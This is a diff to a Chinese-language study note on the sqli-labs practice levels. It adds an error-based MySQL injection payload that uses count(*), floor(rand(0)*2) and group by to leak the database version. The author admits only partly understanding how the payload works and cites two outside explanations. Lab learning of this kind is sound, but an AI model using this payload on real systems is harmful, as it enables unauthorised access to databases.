@@ -207,6 +207,19 @@ Less_1 ～ Less_4都是相同的情况，只需要通过fuzz猜出最后执行�
 
 <code>group by 按照某个变量分组</code>
 
+<h6>注入语句：</h6>   
+
+<code>and (select 1 from (select count(*),concat((select version(),floor(rand(0)*2))a from 
+information_schema.tables group by a)x)%23</code>
+
+关于这个错误的原理，我还是没有了解清楚。不过大致上是：group by 的值不能为rand()产生的数。
+
+[说法一](https://segmentfault.com/q/1010000000609508)
+
+[说法二](http://stackoverflow.com/questions/11787558/sql-injection-attack-what-does-this-do)
+
+
+<code>...待续</code>
 
 
 EOF
